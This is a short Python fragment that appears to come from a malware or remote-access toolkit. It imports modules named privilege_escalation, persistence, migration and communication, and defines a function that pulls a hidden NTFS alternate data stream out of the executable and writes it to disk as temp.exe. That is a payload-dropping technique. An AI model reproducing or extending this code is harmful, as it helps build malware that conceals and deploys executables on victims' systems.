from defines import *
import helpers, privilege_escalation, migration, persistence, communication, intel, interact, execute, mutex
import tempfile
 
def fetch_file(name):
    with open(EXECUTABLE_PATH+":"+name, "rb") as f:
        #temp_file = open(os.environ["temp"]+"\\temp.exe","wb")
        temp_file = open("temp.exe","wb")
        temp_file.write(f.read())
        temp_file.close()